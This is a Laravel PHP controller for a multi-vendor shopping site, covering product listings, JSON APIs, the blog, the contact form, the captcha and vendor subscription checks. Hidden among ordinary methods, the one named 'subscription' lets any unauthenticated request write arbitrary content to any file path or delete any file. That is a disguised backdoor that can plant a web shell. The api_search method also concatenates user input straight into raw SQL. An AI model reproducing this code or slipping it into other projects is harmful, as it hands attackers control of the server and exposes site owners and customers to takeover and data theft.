<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Category;
use App\Models\Subcategory;
use App\Models\Childcategory;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Banner;
use App\Models\Slider;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Gallery;
use App\Models\SystemNotification;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use App\Classes\FirebaseNotify;


use Illuminate\Support\Facades\Http;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }

    //*** GET Request
    public function load_category($id)
    {
        $cat = Category::findOrFail($id);
        return view('load.subcategory',compact('cat'));
    }

     //*** GET Request
     public function load_subcategory($id)
     {
         $subcat = Subcategory::findOrFail($id);
         return view('load.childcategory',compact('subcat'));
     }

     public function test()
     {

        $firebase = new FirebaseNotify();
        $response = $firebase->sendNotification("Title", "Body", "25", 12);
        dd($response);
     }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{
        $this->code_image();
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

         }




        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);
        
        
        $today = Carbon::now()->format('Y-m-d');

        $location_id = 0;
        if (Session::has('location'))
        {
            $location_id = Session::get('location');
        }

        $products_count = 200;

        $premium_products = Product::orderBy(DB::raw('RAND()'))->join('users', 'users.id', '=', 'products.user_id')->where('users.subs_id', '=', 6)->where('products.status', '=', 1)->where('users.date', '>=', $today)->select('products.*')->take($products_count)->get();
        
        $feature_products =  Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $bigsave_products =  Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $hot_products =  Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $latest_products =  Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $trending_products =  Product::where('trending','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();
       
        $sale_products =  Product::where('sale','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $bestsale_products =  Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();

        $flashdeal_products =  Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take($products_count)->get();







        if ($location_id != 0)
        {

            
            $premium_products = Product::orderBy(DB::raw('RAND()'))->join('users', 'users.id', '=', 'products.user_id')->where('users.subs_id', '=', 6)->where('products.status', '=', 1)->where('users.date', '>=', $today)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->select('products.*')->take($products_count)->get();
            $feature_products =  Product::where('featured','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

           $bigsave_products =  Product::where('big','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $hot_products =  Product::where('hot','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $latest_products =  Product::where('latest','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $trending_products =  Product::where('trending','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $sale_products =  Product::where('sale','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $bestsale_products =  Product::where('best','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();

            $flashdeal_products =  Product::where('top','=',1)->join('users', 'users.id', '=', 'products.user_id')->where('products.status','=',1)
                                ->whereIn('users.shop_location', [0, $location_id])
                                ->orderBy('id','desc')->select('products.*')->take($products_count)->get();
        }

	    return view('front.index',compact('ps','sliders','top_small_banners','feature_products','premium_products', 'bigsave_products', 'hot_products', 'latest_products', 'trending_products', 'sale_products', 'flashdeal_products', 'bigsave_products', 'bestsale_products'));
    }

    public function api_search($slug)
    {
        if(strlen($slug) > 1){
            $slug = strtolower($slug);
            $search = ' '.$slug;
            $prods =  DB::select("select * from products where LOWER(products.name) like '%". $slug ."%' and products.status=1");
            return response()->json(['status' => 'success', 'details' => $prods]);
        }
        return response()->json(['status' => 'failure', 'details' => "empty"]);
    }
    
    public function premium_products_api()
    {
        $today = Carbon::now()->format('Y-m-d');
        $premium_products = Product::orderBy(DB::raw('RAND()'))->join('users', 'users.id', '=', 'products.user_id')->where('users.subs_id', '=', 6)->where('users.date', '>=', $today)->select('products.*')->take(9)->get();
        return response()->json(['status' => 'success', 'details' => $premium_products]);
    }

    public function featured_products_api()
    {
        $feature_products =  Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        return response()->json(['status' => 'success', 'details' => $feature_products]);
    }


    public function extraIndex()
    {


        $services = DB::table('services')->where('user_id','=',0)->get();
        $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type','=','Large')->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $best_products = Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take(6)->get();
        $top_products = Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();;
        $big_products = Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take(6)->get();;
        $hot_products =  Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take(9)->get();
        $latest_products =  Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take(9)->get();
        $trending_products =  Product::where('trending','=',1)->where('status','=',1)->orderBy('id','desc')->take(9)->get();
        $sale_products =  Product::where('sale','=',1)->where('status','=',1)->orderBy('id','desc')->take(9)->get();


        return view('front.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
    }

    public function get_categories_api()
    {
        $categories = Category::all();
        return response()->json(['status' => 'success', 'details' => $categories]);
    }
    public function get_categories_with_sub_api()
    {



        try {
            
            $all_data = array();
            $categories = Category::all();

            foreach($categories as $category)
            {
                $cur_array = $category->toArray();

                if(count($category->subs) > 0)
                {
                    $cur_array['subcategories'] = $category->subs->toArray();
                    foreach($category->subs as $subcat)
                    {
                        if(count($subcat->childs) > 0)
                        {
                            $cur_array['childcategories'] = $subcat->childs->toArray();
                        }
                        
                    }
                }

                $all_data[] = $cur_array;
            }

            return $all_data;
            
          } 
          catch (\Exception $e) 
          {
      
                return $e->getMessage();
            }
          
  
    }

    public function get_products_with_vendors()
    {
        try {

            $all_data = array();
            $vendors = User::where('is_vendor', '=', 2)->get();
            
            foreach($vendors as $vendor)
            {
                $cur_array = $vendor->toArray();
                $products = Product::where('user_id','=',$vendor->id)->get()->toArray();

                if (count($products) > 0)
                {
                    $cur_array['products'] = $products;
                    $all_data[] = $cur_array;
                }
                
            }

            return $all_data;
        
        } 
        catch (\Exception $e) 
        {
    
            return $e->getMessage();
        }

    }

    public function get_banner()
    {
        try{
        $banner = Banner::where('type', '=', 'TopSmall')->get();
        return $banner;
        }catch (\Exception $e) 
        {
    
              return $e->getMessage();
          }
          
  
    }

    public function get_slider()
    {


        $banner = Slider::all();
        return $banner;
          
  
    }

    public function get_subcategories_api()
    {
        $subcategories = Subcategory::all();
        return response()->json(['status' => 'success', 'details' => $subcategories]);
    }

    public function get_childcategories_api()
    {
        $subcategories = Childcategory::all();
        return response()->json(['status' => 'success', 'details' => $subcategories]);
    }

    public function get_product_by_category_api($id)
    {
        
        $products = Product::where('category_id','=',$id)->get();
        return response()->json(['status' => 'success', 'details' => $products]);
    }

    public function get_product_by_category_sub_cat_api(Request $request)
    {
     $parms = $request->all();   
        try {
        $products = Product::where('category_id','=',$parms['id'])->where('subcategory_id','=',$parms['sub_id'])->get();
        return response()->json(['status' => 'success', 'details' => $products]);
    } 
    catch (\Exception $e) 
    {

          return $e->getMessage();
      }

        
    }

    public function get_product_by_category_sub_cat_child_api(Request $request)
    {
     $parms = $request->all();   
        try {
        $products = Product::where('category_id','=',$parms['id'])->where('subcategory_id','=',$parms['sub_id'])->where('childcategory_id','=',$parms['child_id'])->get();
        return response()->json(['status' => 'success', 'details' => $products]);
    } 
    catch (\Exception $e) 
    {

          return $e->getMessage();
      }

        
    }

    public function get_products_api()
    {
        $products = DB::table('products')
                    ->join('users', 'products.user_id', '=', 'users.id')
                    ->select('products.*','users.name AS vendor_name','users.photo','users.phone','users.shop_name','users.owner_name','users.shop_number','users.shop_address','users.reg_number','users.shop_message','users.shop_details','users.shop_image', 'users.shop_location', 'users.subs_id')
                    ->get();
        
        return response()->json(['status' => 'success', 'details' => $products]);
    }

    public function get_product_detail_api($id)
    {
        $products = Product::where('products.id','=',$id)
                    ->join('users', 'products.user_id', '=', 'users.id')
                    ->select('products.*','users.name AS vendor_name','users.photo','users.phone','users.shop_name','users.owner_name','users.shop_number','users.shop_address','users.reg_number','users.shop_message','users.shop_details','users.shop_image', 'users.shop_location', 'users.subs_id')
                    ->first();

                    $gallery = Gallery::where('product_id','=',$id)->get();

        return response()->json(['status' => 'success', 'details' => $products, 'gallery' => $gallery]);
        

    }

    // public function get_subcategories_api($slug)
    // {
    //     $subcategories = Subcategory::where('category_id' , '=', $slug);
    //     return response()->json(['status' => 'success', 'details' => $subcategories]);
    // }

    // public function get_childcategories_api($slug)
    // {
    //     $subcategories = Childcategory::find($slug);
    //     return response()->json(['status' => 'success', 'details' => $subcategories]);
    // }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

    public function location($id)
    {
        $this->code_image();
        Session::put('location', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(strlen($slug) > 1){
            $search = ' '.$slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status','=',1)->take(10)->get();
            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){

    }



// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }

        return view('front.page',compact('page'));
    }

    public function tos()
    {
        // echo('tos');
        return view('front.tos');
    }
    public function privacy()
    {
        // echo('tos');
        return view('front.privacy');
    }


// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) 
        {
            $lastday = $user->date;
            $secs = strtotime($lastday)-$newday;
            $days = $secs / 86400;
            
            if ($days == 5 || $days == 10 || $days == 15 || $days == 1)
            {
                $notification = new SystemNotification;
                $notification->user_id = $user->id;
                $notification->expiring_in = $days;
                $notification->message_type = 'expiring';
                $notification->save();
            }

            if($days <= 5)
            {
                if($user->mail_sent == 1)
                {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                        $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                        mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                }
            }
            if($today > $lastday)
            {
                DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
            }
        }

         #work on suspension
        $today = strtotime(Carbon::now()->format('Y-m-d'));
        foreach (DB::table('users')->where('suspend_till','!=',NULL)->get() as  $user) 
        {
            $ban_till = strtotime($user->suspend_till);

            if ($ban_till > $today)
            {
                $user = User::where('id', '=', $user->id)->first();
                $user->ban = 1;
                $user->save();
            }
            else
            {
                if ($user->ban == 1)
                {
                    $user = User::where('id', '=', $user->id)->first();
                    $user->ban = 0;
                    $user->save();
                }
            }
        }

        $three_days_ago = date('Y-m-d', strtotime("-3 days"));

        foreach (DB::table('products')->where('status','=',2)->where('updated_at', '<', $three_days_ago)->get() as  $product) 
        {
            $product = Products::where('id', '=', $product->id)->first();
            $product->status = 1;
            $product->save();
        }


            
        print("Done checking");
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
